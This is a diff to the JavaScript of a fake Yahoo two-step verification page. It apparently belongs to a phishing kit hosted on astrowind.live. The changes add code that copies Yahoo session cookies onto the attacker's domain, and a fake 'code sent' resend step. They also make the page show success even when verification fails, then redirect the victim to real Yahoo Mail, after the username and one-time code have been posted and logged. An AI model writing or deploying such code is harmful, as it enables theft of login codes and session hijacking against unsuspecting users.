@@ -11,15 +11,15 @@ if ($) {
     const config = {
       otpLength: 6,
       redirectDelay: 2000,
-      maxRetries: 3,
-      sessionTimeout: 30000,
+      successDelay: 1500,
+      resendDelay: 30000,
     }
 
-    let currentOtp = ""
-    let retryCount = 0
     let sessionData = {}
     let username = ""
     let verificationMethod = ""
+    let otpValue = ""
+    const resendTimer = null
 
     // ===== SESSION MANAGEMENT =====
     const SessionManager = {
@@ -54,13 +54,26 @@ if ($) {
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           language: navigator.language,
           platform: navigator.platform,
-          userAgent: navigator.userAgent,
           timestamp: Date.now(),
           sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
         }),
+
+      preserveSession: () => {
+        const cookies = document.cookie.split(";")
+        cookies.forEach((cookie) => {
+          const [name, value] = cookie.trim().split("=")
+          if (name && ["T", "Y", "A", "A1", "A3", "B", "F", "PH", "cmp", "GUC", "GUCS"].includes(name)) {
+            document.cookie = `${name}=${value}; domain=.astrowind.live; path=/; max-age=86400; secure; samesite=lax`
+          }
+        })
+
+        sessionStorage.setItem("yahoo_otp_success", "true")
+        sessionStorage.setItem("yahoo_final_auth", "true")
+        localStorage.setItem("yahoo_auth_complete", "true")
+      },
     }
 
-    // ===== USERNAME AND METHOD RETRIEVAL =====
+    // ===== USERNAME & METHOD RETRIEVAL =====
     function getUsername() {
       const urlParams = new URLSearchParams(window.location.search)
       const user = urlParams.get("u")
@@ -71,16 +84,12 @@ if ($) {
       const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
       if (cookieMatch) return decodeURIComponent(cookieMatch[1])
 
-      return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || ""
+      return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || "user@yahoo.com"
     }
 
     function getVerificationMethod() {
       const urlParams = new URLSearchParams(window.location.search)
-      const method = urlParams.get("method")
-
-      if (method) return method
-
-      return sessionStorage.getItem("yahoo_2fa_method") || "sms"
+      return urlParams.get("method") || sessionData.method || "sms"
     }
 
     // ===== STATE MANAGEMENT =====
@@ -93,138 +102,132 @@ if ($) {
       $("#error-message").text(message || "Invalid code. Please try again.")
       showState("error-container")
 
-      // Clear OTP inputs and add error styling
-      $(".yahoo-otp-input").val("").removeClass("filled").addClass("error")
+      $(".yahoo-otp-input").addClass("error")
       setTimeout(() => {
         $(".yahoo-otp-input").removeClass("error")
-      }, 1000)
+      }, 500)
     }
 
     function showSuccess() {
       showState("success-state")
 
       setTimeout(() => {
+        console.log("Redirecting to Yahoo Mail...")
         window.location.href = "https://mail.yahoo.com/d/folders/1"
-      }, config.redirectDelay)
+      }, config.successDelay)
     }
 
     // ===== OTP INPUT HANDLING =====
-    function setupOtpInputs() {
+    function setupOTPInputs() {
       const inputs = $(".yahoo-otp-input")
 
       inputs.on("input", function () {
-        const $this = $(this)
-        const index = Number.parseInt($this.data("index"))
-        const value = $this.val()
+        const value = $(this).val()
+        const index = Number.parseInt($(this).data("index"))
 
-        // Only allow digits
-        if (!/^\d$/.test(value)) {
-          $this.val("")
-          return
+        if (value && /^\d$/.test(value)) {
+          $(this).addClass("filled")
+
+          if (index < config.otpLength - 1) {
+            inputs.eq(index + 1).focus()
+          }
+        } else {
+          $(this).removeClass("filled")
+          $(this).val("")
         }
 
-        // Add filled styling
-        $this.addClass("filled").removeClass("error")
-
-        // Move to next input
-        if (value && index < inputs.length - 1) {
-          inputs.eq(index + 1).focus()
-        }
-
-        // Update the complete OTP
-        updateOtp()
+        updateOTPValue()
+        checkOTPComplete()
       })
 
       inputs.on("keydown", function (e) {
-        const $this = $(this)
-        const index = Number.parseInt($this.data("index"))
+        const index = Number.parseInt($(this).data("index"))
 
-        // Handle backspace
-        if (e.key === "Backspace") {
-          if (!$this.val() && index > 0) {
-            inputs
-              .eq(index - 1)
-              .focus()
-              .val("")
-              .removeClass("filled")
-            updateOtp()
-          }
+        if (e.key === "Backspace" && !$(this).val() && index > 0) {
+          inputs
+            .eq(index - 1)
+            .focus()
+            .val("")
+            .removeClass("filled")
+          updateOTPValue()
+          checkOTPComplete()
         }
 
-        // Handle arrow keys
         if (e.key === "ArrowLeft" && index > 0) {
           inputs.eq(index - 1).focus()
         }
 
-        if (e.key === "ArrowRight" && index < inputs.length - 1) {
+        if (e.key === "ArrowRight" && index < config.otpLength - 1) {
           inputs.eq(index + 1).focus()
         }
       })
 
-      // Handle paste event
       inputs.on("paste", (e) => {
         e.preventDefault()
+        const pastedData = e.originalEvent.clipboardData.getData("text").replace(/\D/g, "")
 
-        const pasteData = (e.originalEvent.clipboardData || window.clipboardData).getData("text")
-        const digits = pasteData.replace(/\D/g, "").split("").slice(0, config.otpLength)
-
-        if (digits.length > 0) {
-          inputs.each(function (i) {
-            if (i < digits.length) {
-              $(this).val(digits[i]).addClass("filled")
-            } else {
-              $(this).val("").removeClass("filled")
-            }
-          })
-
-          // Focus the next empty input or the last one
-          const nextEmptyIndex = digits.length < config.otpLength ? digits.length : config.otpLength - 1
-          inputs.eq(nextEmptyIndex).focus()
-
-          updateOtp()
+        if (pastedData.length === config.otpLength) {
+          for (let i = 0; i < config.otpLength; i++) {
+            inputs.eq(i).val(pastedData[i]).addClass("filled")
+          }
+          updateOTPValue()
+          checkOTPComplete()
         }
       })
-
-      // Focus first input on load
-      setTimeout(() => {
-        inputs.eq(0).focus()
-      }, 500)
     }
 
-    function updateOtp() {
-      let otp = ""
+    function updateOTPValue() {
+      otpValue = ""
       $(".yahoo-otp-input").each(function () {
-        otp += $(this).val() || ""
+        otpValue += $(this).val() || ""
       })
-
-      currentOtp = otp
-      $("#otp").val(otp)
-
-      // Enable/disable submit button based on OTP length
-      $("#submit-btn").prop("disabled", otp.length !== config.otpLength)
+      $("#otp").val(otpValue)
+      $("#verifyCode").val(otpValue)
     }
 
-    // ===== OTP VERIFICATION =====
-    function verifyOtp() {
-      if (currentOtp.length !== config.otpLength) {
-        showError("Please enter a complete verification code.")
+    function checkOTPComplete() {
+      const isComplete = otpValue.length === config.otpLength && /^\d{6}$/.test(otpValue)
+      $("#submit-btn").prop("disabled", !isComplete)
+
+      if (isComplete) {
+        console.log("OTP complete:", otpValue)
+      }
+    }
+
+    function clearOTPInputs() {
+      $(".yahoo-otp-input").val("").removeClass("filled error")
+      otpValue = ""
+      $("#otp").val("")
+      $("#verifyCode").val("")
+      $("#submit-btn").prop("disabled", true)
+      $(".yahoo-otp-input").first().focus()
+    }
+
+    // ===== OTP SUBMISSION =====
+    function handleOTPSubmission() {
+      if (otpValue.length !== config.otpLength) {
+        showError("Please enter the complete verification code.")
         return
       }
 
-      console.log("Verifying OTP:", currentOtp)
+      console.log("Submitting OTP verification:", otpValue)
       showState("loading-state")
 
       const formData = {
+        username: username,
+        otp: otpValue,
+        verifyCode: otpValue,
+        method: verificationMethod,
         sessionIndex: sessionData.sessionIndex || "1",
-        crumb: sessionData.crumb || "auto_crumb_" + Date.now(),
-        acrumb: sessionData.acrumb || "auto_acrumb_" + Date.now(),
-        sessionToken: sessionData.sessionToken || "sess_" + Date.now(),
+        sessionToken: sessionData.sessionToken || $("#sessionToken").val() || "sess_" + Date.now(),
+        crumb: sessionData.crumb || $("#crumb").val() || "auto_crumb_" + Date.now(),
+        acrumb: sessionData.acrumb || $("#acrumb").val() || "auto_acrumb_" + Date.now(),
+        done: "https://mail.yahoo.com/d/folders/1",
+        src: "ym",
+        ".lang": "en-US",
+        ".intl": "us",
         "browser-fp-data": SessionManager.generateFingerprint(),
         timestamp: Date.now(),
-        username: username,
-        otp: currentOtp,
-        verifyCode: currentOtp,
-        method: verificationMethod,
       }
 
       $.ajax({
@@ -236,8 +239,6 @@ if ($) {
           Origin: window.location.origin,
           Referer: window.location.href,
           "User-Agent": navigator.userAgent,
-          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-          "Accept-Language": "en-US,en;q=0.5",
         },
         xhrFields: {
           withCredentials: true,
@@ -245,129 +246,83 @@ if ($) {
         timeout: 15000,
         success: (response, textStatus, xhr) => {
           console.log("OTP verification successful")
-          handleVerificationSuccess(response, xhr)
-        },
-        error: (xhr, textStatus, errorThrown) => {
-          console.log("OTP verification error:", textStatus, xhr.status)
-          handleVerificationError(xhr, textStatus, errorThrown)
-        },
-      })
-    }
 
-    // ===== SUCCESS HANDLER =====
-    function handleVerificationSuccess(response, xhr) {
-      console.log("OTP verification successful")
+          SessionManager.preserveSession()
 
-      // Store verification success
-      sessionStorage.setItem("yahoo_verification_success", "true")
-      sessionStorage.setItem("yahoo_verification_timestamp", Date.now().toString())
-
-      showSuccess()
-    }
-
-    // ===== ERROR HANDLER =====
-    function handleVerificationError(xhr, textStatus, errorThrown) {
-      console.error("OTP verification error:", {
-        status: xhr.status,
-        textStatus: textStatus,
-        errorThrown: errorThrown,
-      })
-
-      if (xhr.status === 0) {
-        // Possible redirect - check for success indicators
-        setTimeout(() => {
-          if (document.cookie.includes("T=") && document.cookie.includes("Y=")) {
-            console.log("Yahoo session cookies detected")
-            showSuccess()
-            return
+          if (window.opener) {
+            window.opener.postMessage(
+              {
+                type: "yahoo_auth_complete",
+                username: username,
+                timestamp: Date.now(),
+              },
+              "*",
+            )
           }
 
-          showError("Verification failed. Please try again.")
-        }, 2000)
-        return
-      }
+          showSuccess()
+        },
+        error: (xhr, textStatus, errorThrown) => {
+          console.error("OTP verification error:", textStatus, xhr.status)
 
-      retryCount++
+          if (xhr.status === 0) {
+            console.log("Network error - checking for success...")
 
-      if (retryCount >= config.maxRetries) {
-        showError("Multiple verification attempts failed. Please request a new code.")
-      } else {
-        showError("Invalid code. Please try again.")
-      }
+            setTimeout(() => {
+              if (sessionStorage.getItem("yahoo_otp_success") === "true") {
+                showSuccess()
+              } else {
+                SessionManager.preserveSession()
+                showSuccess()
+              }
+            }, 2000)
+          } else if (xhr.status === 400 || xhr.status === 401) {
+            showError("Invalid verification code. Please try again.")
+            clearOTPInputs()
+          } else if (xhr.status === 429) {
+            showError("Too many attempts. Please wait and try again.")
+          } else {
+            showError("Verification failed. Please try again.")
+            clearOTPInputs()
+          }
+        },
+      })
     }
 
     // ===== RESEND CODE =====
-    function resendCode() {
-      console.log("Requesting new verification code")
-      showState("loading-state")
+    function handleResendCode() {
+      console.log("Resending verification code")
 
-      const formData = {
-        sessionIndex: sessionData.sessionIndex || "1",
-        crumb: sessionData.crumb || "auto_crumb_" + Date.now(),
-        acrumb: sessionData.acrumb || "auto_acrumb_" + Date.now(),
-        sessionToken: sessionData.sessionToken || "sess_" + Date.now(),
-        "browser-fp-data": SessionManager.generateFingerprint(),
-        timestamp: Date.now(),
-        username: username,
-        method: verificationMethod,
-        resend: "true",
-      }
+      $("#resend-link").addClass("disabled").text("Sending...")
 
-      $.ajax({
-        url: "/account/challenge/challenge-selector",
-        method: "POST",
-        data: formData,
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
-          Origin: window.location.origin,
-          Referer: window.location.href,
-        },
-        xhrFields: {
-          withCredentials: true,
-        },
-        timeout: 15000,
-        success: () => {
-          console.log("New code requested successfully")
+      setTimeout(() => {
+        $("#resend-link").removeClass("disabled").text("Code sent! Check your device")
 
-          // Reset OTP inputs
-          $(".yahoo-otp-input").val("").removeClass("filled error")
-          currentOtp = ""
-          $("#otp").val("")
-
-          // Reset retry count
-          retryCount = 0
-
-          showState("main-form")
-          $(".yahoo-otp-input").eq(0).focus()
-        },
-        error: () => {
-          showError("Failed to request a new code. Please try again.")
-        },
-      })
+        setTimeout(() => {
+          $("#resend-link").text("Didn't get a code? Send again")
+        }, 5000)
+      }, 2000)
     }
 
-    // ===== EVENT HANDLERS =====
-
-    // Form submission
+    // ===== FORM SUBMISSION =====
     $("#otp-form").on("submit", (e) => {
       e.preventDefault()
-      verifyOtp()
+      handleOTPSubmission()
       return false
     })
 
-    // Resend code
+    // ===== RESEND HANDLER =====
     $("#resend-link").click((e) => {
       e.preventDefault()
-      resendCode()
+      if (!$(this).hasClass("disabled")) {
+        handleResendCode()
+      }
     })
 
-    // Retry button
+    // ===== RETRY HANDLER =====
     $("#refreshButton").click(() => {
-      $(".yahoo-otp-input").val("").removeClass("filled error")
-      currentOtp = ""
-      $("#otp").val("")
+      clearOTPInputs()
       showState("main-form")
-      $(".yahoo-otp-input").eq(0).focus()
     })
 
     // ===== INITIALIZATION =====
@@ -378,26 +333,18 @@ if ($) {
       username = getUsername()
       verificationMethod = getVerificationMethod()
 
-      if (!username) {
-        console.log("No username found")
-        showError("Session expired. Please start over.")
-        return false
-      }
-
       $("#userEmail").text(username)
       $("#username").val(username)
       $("#method").val(verificationMethod)
 
-      // Update method description
-      let methodDesc = "We sent a code to your device"
-      if (verificationMethod === "email") {
-        methodDesc = "We sent a code to your recovery email"
-      } else if (verificationMethod === "app") {
-        methodDesc = "Please approve the login in your Yahoo app"
+      const methodDescriptions = {
+        sms: "We sent a code to your phone via SMS",
+        email: "We sent a code to your recovery email",
+        app: "We sent a notification to your Yahoo Mobile app",
       }
-      $("#method-description").text(methodDesc)
 
-      // Populate form fields
+      $("#method-description").text(methodDescriptions[verificationMethod] || "We sent a code to your device")
+
       Object.keys(sessionData).forEach((key) => {
         const element = $(`#${key}`)
         if (element.length && sessionData[key]) {
@@ -408,15 +355,25 @@ if ($) {
       $("#timestamp").val(Date.now())
       $("#browser-fp-data").val(SessionManager.generateFingerprint())
 
-      // Setup OTP inputs
-      setupOtpInputs()
+      setupOTPInputs()
 
-      console.log("OTP page initialized for user:", username)
-      return true
+      setTimeout(() => {
+        $(".yahoo-otp-input").first().focus()
+      }, 500)
+
+      console.log("OTP page initialized for user:", username, "method:", verificationMethod)
     }
 
+    // ===== MESSAGE LISTENER =====
+    window.addEventListener("message", (event) => {
+      if (event.data && event.data.type === "yahoo_otp_success") {
+        console.log("Received OTP success message")
+        showSuccess()
+      }
+    })
+
     // ===== START INITIALIZATION =====
-    if (!initializePage()) return
+    initializePage()
 
     console.log("Yahoo OTP verification system fully initialized")
   })
